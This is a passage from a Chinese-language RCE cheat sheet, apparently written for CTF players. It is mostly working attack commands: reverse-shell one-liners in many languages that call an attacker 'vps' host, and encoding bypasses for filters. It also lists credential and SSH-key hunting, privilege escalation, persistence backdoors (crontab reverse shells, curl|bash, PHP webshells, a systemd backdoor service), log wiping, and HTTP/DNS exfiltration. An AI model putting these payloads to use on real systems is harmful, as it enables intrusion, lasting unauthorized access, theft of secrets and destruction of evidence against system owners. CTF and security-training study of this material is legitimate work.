# >&：将标准输出和标准错误重定向
# /dev/tcp/vps/port：建立TCP连接
# 0>&1：将标准输入重定向到标准输出
```

变种

```bash
# 使用bash -c执行
bash -c 'bash -i >& /dev/tcp/10.0.0.1/1234 0>&1'

# 使用exec
exec 5<>/dev/tcp/10.0.0.1/1234;cat <&5|while read line;do $line 2>&5>&5;done

# 使用文件描述符
0<&196;exec 196<>/dev/tcp/10.0.0.1/1234;sh <&196 >&196 2>&196

# 使用sh
sh -i >& /dev/tcp/10.0.0.1/1234 0>&1
```

- **编码绕过**

```bash
# Base64编码
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8xMjM0IDA+JjE= | base64 -d | bash

# Hex编码
echo 626173682...| xxd -r -p | bash

# 分段执行
echo "bash -i >& /dev/tcp/10.0.0.1/1234 0>&1" > /tmp/shell.sh
bash /tmp/shell.sh
```

- **无空格反弹**

```bash
# 使用$IFS
bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>&${IFS}/dev/tcp/10.0.0.1/1234${IFS}0>&1'

# 使用<>
bash<>-c<>'bash<>-i<>>&<>/dev/tcp/10.0.0.1/1234<>0>&1'

# 使用{}
{bash,-c,'bash -i >& /dev/tcp/10.0.0.1/1234 0>&1'}
```

## NC(Netcat)反弹shell

- **-e参数**

```bash
# Linux
nc -e /bin/bash vps port
nc -e /bin/sh vps port

# Windows
nc -e cmd.exe vps port
nc.exe -e cmd.exe vps port
```

 比较传统的做法，但是很多系统的nc不支持-e参数

- **管道方式(无-e参数)**

```bash
# 方法1：使用命名管道
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc vps port >/tmp/f

# 方法2：双向管道
nc vps port1 | /bin/bash | nc vps port2

# 方法3：使用mknod
mknod /tmp/backpipe p;/bin/sh 0</tmp/backpipe | nc vps port 1>/tmp/backpipe
```

详细解释

```bash
rm /tmp/f              # 删除可能存在的文件
mkfifo /tmp/f          # 创建命名管道
cat /tmp/f             # 读取管道内容
| /bin/sh -i 2>&1      # 传给shell执行，错误也输出
| nc vps port          # 结果发送到vps
> /tmp/f               # 从vps接收的命令写入管道
```

- **ncat**

```bash
# 基础用法
ncat vps port -e /bin/bash

# SSL加密连接
ncat --ssl vps port -e /bin/bash
```

## Python反弹shell

- **socket方式**

```python
# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("vps",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("vps",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

格式化版本

```python
import socket,subprocess,os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.1", 1234))

# 重定向标准输入输出到socket
os.dup2(s.fileno(), 0)  # stdin
os.dup2(s.fileno(), 1)  # stdout
os.dup2(s.fileno(), 2)  # stderr

# 启动shell
p = subprocess.call(["/bin/sh", "-i"])
```

- **pty方式(交互式)**

```python
# 完整交互式shell
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("vps",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");'

# 升级为完全交互式
python -c 'import pty;pty.spawn("/bin/bash")'
```

- **无空格版本**

```python
# 使用exec
python -c "exec(\"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('vps',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\")"
```

## PHP反弹shell

- **fsockopen方式**

```php
php -r '$sock=fsockopen("vps",port);exec("/bin/sh -i <&3 >&3 2>&3");'
```

详细版本

```php
<?php
$sock = fsockopen("10.0.0.1", 1234);
$proc = proc_open("/bin/sh -i", array(
    0=>$sock, 
    1=>$sock, 
    2=>$sock
), $pipes);
?>
```

- **socket**

```php
php -r '$sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_connect($sock,"vps",port);socket_write($sock,shell_exec("whoami"));'
```

- **完整交互式**

```php
<?php
set_time_limit(0);
$ip = '10.0.0.1';
$port = 1234;
$sock = fsockopen($ip, $port);
$descriptorspec = array(
   0 => $sock,
   1 => $sock,
   2 => $sock
);
$process = proc_open('/bin/sh', $descriptorspec, $pipes);
proc_close($process);
?>
```

## Perl反弹shell

```perl
# 方法1：基础版本
perl -e 'use Socket;$i="vps";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# 方法2：无空格版本
perl -e 'use Socket;$i="vps";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh","-i");};'
```

## Ruby反弹shell

```ruby
# 方法1：基础版本
ruby -rsocket -e'f=TCPSocket.open("vps",port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# 方法2：完整版本
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("vps","port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## Java反弹shell

```java
// 方法1：Runtime方式
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/vps/port;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

// 方法2：ProcessBuilder方式
String host="vps";
int port=1234;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();
    Thread.sleep(50);
    try {p.exitValue();break;}catch (Exception e){}
};
```

## Telnet反弹shell

```bash
# 方法1：双向telnet
telnet vps port1 | /bin/bash | telnet vps port2

# 方法2：使用管道
rm -f /tmp/p; mknod /tmp/p p && telnet vps port 0</tmp/p | /bin/bash 1>/tmp/p
```

VPS监听

```bash
# 监听port1（接收命令）
nc -lvp port1

# 监听port2（接收结果）
nc -lvp port2
```

## PowerShell反弹shell(Windows)

```powershell
# 方法1：基础版本
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('vps',port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# 方法2：Base64编码
powershell -enc <base64_encoded_command>

# 方法3：下载执行
powershell "IEX(New-Object Net.WebClient).DownloadString('http://vps/shell.ps1')"
```

## 反弹Shell升级技巧

- **升级为完整交互式Shell**

```bash
# 步骤1：Python升级
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 步骤2：后台挂起
Ctrl + Z

# 步骤3：设置本地终端
stty raw -echo; fg

# 步骤4：重置终端
reset
export SHELL=bash
export TERM=xterm-256color
stty rows 38 columns 116  # 根据实际调整
```

- **保持连接稳定**

```bash
# 使用nohup防止断开
nohup bash -i >& /dev/tcp/vps/port 0>&1 &

# 使用screen/tmux
screen -dmS shell bash -i >& /dev/tcp/vps/port 0>&1

# 定时重连
while true; do bash -i >& /dev/tcp/vps/port 0>&1; sleep 60; done
```

## VPS监听

```bash
# 方法1：nc监听
nc -lvp 1234
nc -lvnp 1234  # 不解析域名

# 方法2：ncat监听（支持SSL）
ncat -lvp 1234
ncat --ssl -lvp 1234

# 方法3：socat监听
socat TCP-LISTEN:1234,reuseaddr,fork EXEC:/bin/bash

# 方法4：metasploit监听
use exploit/multi/handler
set payload linux/x86/shell/reverse_tcp
set LHOST 0.0.0.0
set LPORT 1234
exploit
```

# 5. Payload整理

## 信息收集阶段

```
- 系统信息收集
- 敏感文件查找
- Web目录信息
```

- **系统信息收集**

```bash
# 一键收集脚本
uname -a; cat /etc/issue; cat /etc/*-release; hostname; id; whoami; groups; w; last; history | tail -20

# 详细版本
echo "=== 系统信息 ==="
uname -a
cat /etc/issue
cat /etc/*-release
cat /proc/version

echo "=== 用户信息 ==="
id
whoami
groups
cat /etc/passwd
cat /etc/shadow 2>/dev/null

echo "=== 网络信息 ==="
ifconfig
ip addr
netstat -antp
ss -antp
cat /etc/hosts
cat /etc/resolv.conf

echo "=== 进程信息 ==="
ps aux
ps -ef
top -n 1

echo "=== 环境变量 ==="
env
printenv
echo $PATH
```

- **敏感文件查找**

```bash
# 查找flag
find / -name "*flag*" 2>/dev/null
find / -name "flag*" -type f 2>/dev/null
grep -r "flag{" / 2>/dev/null
grep -r "ctfhub{" / 2>/dev/null

# 查找配置文件
find / -name "*.conf" 2>/dev/null
find / -name "config.php" 2>/dev/null
find /var/www/ -name "*.php" 2>/dev/null

# 查找数据库文件
find / -name "*.db" 2>/dev/null
find / -name "*.sql" 2>/dev/null

# 查找密码文件
grep -r "password" /var/www/ 2>/dev/null
grep -r "passwd" /etc/ 2>/dev/null

# 查找SSH密钥
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# 查找历史命令
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.php_history
```

- **Web目录信息**

```bash
# 查找Web根目录
ls -la /var/www/html/
ls -la /var/www/
ls -la /usr/share/nginx/html/
ls -la /home/*/public_html/

# 查找可写目录
find / -writable -type d 2>/dev/null
find /var/www/ -writable 2>/dev/null

# 查找最近修改的文件
find /var/www/ -mtime -1 2>/dev/null
find / -mtime -1 -type f 2>/dev/null
```

## 权限提升阶段

```
- SUID提权
- 定时任务提权
- 内核漏洞提权
- sudo提权
```

- **SUID提权**

```bash
# 查找SUID文件
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -4000 -type f 2>/dev/null

# 常见可利用的SUID
/usr/bin/find
/usr/bin/vim
/usr/bin/nmap
/usr/bin/python
/usr/bin/perl
/usr/bin/php
/usr/bin/ruby
/bin/bash
/bin/sh
```

- **定时任务提权**

```bash
# 查看定时任务
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
cat /var/spool/cron/*

# 利用可写的定时任务
echo "* * * * * root bash -i >& /dev/tcp/vps/port 0>&1" >> /etc/crontab
```

- **内核漏洞提权**

```bash
# 查看内核版本
uname -a
cat /proc/version

# 搜索可用exploit
searchsploit kernel | grep -i "privilege escalation"
searchsploit linux kernel 3.13

# 常见内核漏洞
# CVE-2016-5195 (DirtyCow)
# CVE-2017-16995
# CVE-2021-3493
```

- **sudo提权**

````bash
# 查看sudo权限
sudo -l

# 利用sudo执行命令
sudo /usr/bin/find / -exec /bin/sh \;
sudo vim -c ':!/bin/sh'
sudo python -c 'import os;os.system("/bin/bash")'

# sudo配置错误
# 如果允许无密码执行某些命令
sudo /path/to/command
````

## 持久化阶段

```
- SSH后门
- Crontab后门
- WebShell后门
- 系统服务后门
```

- **SSH后门**

```bash
# 方法1：添加SSH公钥
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh

# 方法2：修改SSH配置
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
service sshd restart

# 方法3：创建新用户
useradd -m -s /bin/bash hacker
echo "hacker:password" | chpasswd
usermod -aG sudo hacker
```

- **Crontab后门**

```bash
# 添加定时反弹shell
(crontab -l;echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/vps/port 0>&1'")|crontab

# 添加定时下载执行
(crontab -l;echo "*/10 * * * * curl http://vps/shell.sh|bash")|crontab

# 查看是否添加成功
crontab -l
```

- **WebShell后门**

```bash
# PHP一句话木马
echo '<?php @eval($_POST[a]);?>' > /var/www/html/shell.php
echo '<?php system($_GET[cmd]);?>' > /var/www/html/cmd.php

# 隐藏WebShell
echo '<?php @eval($_POST[a]);?>' > /var/www/html/.shell.php
echo '<?php @eval($_POST[a]);?>' > /var/www/html/favicon.ico

# 图片马
cat shell.php >> image.jpg
```

- **系统服务后门**

```bash
# 创建systemd服务
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/vps/port 0>&1; sleep 60; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# 启动服务
systemctl daemon-reload
systemctl enable backdoor.service
systemctl start backdoor.service
```

## 痕迹清理阶段

```
- 清除命令历史
- 清除日志
- 清除文件痕迹
```

- **清除命令历史**

````bash
# 清除当前会话历史
history -c

# 清除历史文件
echo > ~/.bash_history
cat /dev/null > ~/.bash_history
rm ~/.bash_history

# 禁用历史记录
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0
````

- **清除日志**

```bash
# 清除系统日志
echo > /var/log/auth.log
echo > /var/log/syslog
echo > /var/log/messages
echo > /var/log/secure

# 清除Web日志
echo > /var/log/apache2/access.log
echo > /var/log/apache2/error.log
echo > /var/log/nginx/access.log
echo > /var/log/nginx/error.log

# 清除wtmp/utmp
echo > /var/log/wtmp
echo > /var/log/utmp
echo > /var/log/lastlog

# 删除特定IP的日志
sed -i '/10.0.0.1/d' /var/log/apache2/access.log
```

- **清除文件痕迹**

```bash
# 删除上传的文件
rm -f /tmp/exploit
rm -f /var/www/html/shell.php

# 修改文件时间戳
touch -r /etc/passwd /tmp/backdoor
touch -t 202301010000 /tmp/file

# 安全删除（覆盖）
shred -vfz -n 10 /tmp/sensitive_file
```

# 6. WindowsRCE

Windows 下的 RCE 思路和 Linux 很像，核心仍然是：

1. 找到可执行命令的入口
2. 绕过过滤
3. 在无回显时把结果带出来
4. 进一步做反弹 shell 或落地利用

不过 Windows 体系里有一些和 Linux 完全不同的命令、符号和常用绕过点

## 命令执行入口

- **PHP**

```
system()
exec()
shell_exec()
passthru()
popen()
proc_open()
```

- **ASP / ASP.NET / IIS**

````
cmd /c
powershell -c
WScript.Shell
Shell.Application
````

## 常用命令

- **文件与目录查看**

```cmd
dir              #列出当前目录下所有文件
type file.txt    #把file.txt的内容一次性输出到控制台
more file.txt    #分页显示file.txt的内容，按空格翻页，q退出
tree             #以树状图形式显示当前目录的子目录和文件结构
```

- **搜索**

```cmd
findstr flag file.txt
findstr /s /i "flag" *.txt
```

- **系统信息**

```cmd
whoami
ipconfig
systeminfo
ver
tasklist
```

- **用户与权限**

```cmd
whoami /all
net user
net localgroup administrators
```

## 命令连接符

- **&**

无条件执行后面的命令

```
dir & whoami
```

- **&&**

前一个成功才执行后一个

```
dir && whoami
```

- **||**

前一个失败才执行后一个

```
dir || whoami
```

- **|**

管道符，常和 `findstr` 配合

```
ipconfig | findstr IPv4
```

## 基础绕过点

- **空格绕过**

```
%20

^ 转义

引号包裹

, 在某些场景可替代分隔作用

cmd/c 写法调整
```

- **关键字绕过**

```
大小写混用

插入特殊字符（^ 、 "、\）

利用变量拆分

用别的命令替代
```

- **读文件替代命令**

```
type

more

findstr
```

## 常用模板

- **基础执行**

```cmd
cmd /c whoami
cmd /c dir
```

- **带输出执行**

```cmd
cmd /c type flag.txt
```

- **PowerShell执行**

```powershell
powershell -c "whoami"
powershell -c "Get-Content flag.txt"
```

- **下载执行**

```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://vps/shell.ps1')"
```

- **文件写入**

```cmd
echo test > a.txt
type flag.txt > out.txt
```

## 无回显RCE

- **写文件**

```cmd
whoami > 1.txt
type flag.txt > flag_out.txt
```

然后访问文件

- **DNS外带**

```cmd
ping whoami.dnslog.cn
nslookup whoami.dnslog.cn
```

如果能嵌入命令结果，就能外带

- **HTTP外带**

```cmd
powershell -c "iwr http://vps/?d=$(whoami)"
```

或者

```
curl http://vps/?d=whoami
```

- **PowerShell读取并回传**

```powershell
powershell -c "$a=Get-Content flag.txt; iwr http://vps/?d=$a"
```

## 反弹shell

- **PowerShell反弹**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('vps',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- **mshta / vbscript / wscript**

在一些环境中会用这些 Windows 原生程序做落地或执行

- **certutil下载**

```cmd
certutil -urlcache -split -f http://vps/a.exe a.exe
```

## 过滤常见思路

- **过滤空格**

```
用 %20
用 ^
用引号
用批处理变量拼接
```

- **过滤关键字**

```
eg:  powershell

用缩写/调用方式变体
用 cmd /c 转调用
用 mshta、wscript 等替代
```

- **过滤某些字符**

```
eg: 过滤了& |

改用 cmd /c
使用 URL 编码
使用批处理语法和变量拼接
```

# 7. 其他漏洞结合

## SSTI

- **Jinja2（Python）**

<u>思路</u>：

1. 找模板上下文
2. 通过对象链拿到os
3. 调用popen() 或者 system()

<u>常见payload思路</u>

```python
&#123;&#123;config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

或者通过对象遍历

```python
&#123;&#123;''.__class__.__mro__[1].__subclasses__()}}
```

- **Twig(PHP)**

<u>思路</u>:

1. 找可调用的过滤器或函数
2. 利用环境对象执行函数

- **Smarty**

```
{system('id')}
```

## 反序列化

简单说说

- **PHP反序列化**

<u>常见落脚点</u>：

```
eval()
system()
include
文件写入
任意调用
```

- **Java反序列化**

<u>常见触发点</u>

```
ObjectInputStream.readObject()
RMI
Hessian
XMLDecoder
```

<u>常见利用方向</u>

```
CC 链
CommonsBeanUtils
Fastjson 历史问题
JNDI 注入
```

<u>常见目标</u>

```
Runtime.getRuntime().exec()
ProcessBuilder
动态类加载
JNDI 远程加载字节码
```

- **Python反序列化**

<u>常见点</u>

```
pickle.loads()
yaml.load()（不安全配置）
marshal 某些误用
```

<u>利用</u>

```
构造对象在反序列化时执行代码，例如 __reduce__
```

## SQL

SQL 注入不总是直接变 RCE，但在特定数据库和权限配置下，可以进一步执行系统命令

 ```
 SQL注入到RCE的常见路径
 
 - 写WebShell
   SQLi -> 写入 PHP 文件 -> 执行 WebShell -> RCE
   
 - 数据库函数执行命令
   SQLi -> 调用数据库命令执行能力 -> 系统命令执行
 
 - 提权
   SQLi -> 拿到数据库权限 -> 利用数据库运行账户权限 -> 系统层面进一步控制
 ```

- **MySQL方向**

<u>常见思路</u>

```
INTO OUTFILE 写 WebShell
LOAD_FILE() 读文件
UDF 提权执行系统命令
```

<u>示例</u>

```sql
SELECT '<?php @eval($_POST[1]);?>' INTO OUTFILE '/var/www/html/shell.php';
```

这不是“直接命令执行”，但已经能落 WebShell，然后继续 RCE

- **MSSQL方向**

<u>常见能力</u>：

**xp_cmdshell** ——如果开启，就可以直接执行系统命令

<u>思路</u>

```sql
EXEC xp_cmdshell 'whoami';
```

- **PostgreSQL方向**

<u>常见能力</u>

```
COPY ... FROM PROGRAM
某些扩展/函数链
```

<u>思路</u>

```sql
COPY (SELECT '') TO PROGRAM 'id';
```

- **Oracle方向**

Oracle中也可能通过

```
Java 存储过程
外部过程
某些包函数
```

间接执行系统命令

## LFI

- **常见思路**

```
本地文件包含 LFI
日志包含
Session 包含
伪协议
上传文件包含
```

- **eg**

```
包含日志文件，把恶意 PHP 语句写进 User-Agent，再 include 日志
包含 session 文件
php://filter
data://
php://input
```

## upload

**目标**

```
上传 WebShell
绕过后缀检查
绕过 MIME 检查
绕过图片检测
解析漏洞利用
```

上传成功后，访问上传文件即可执行代码
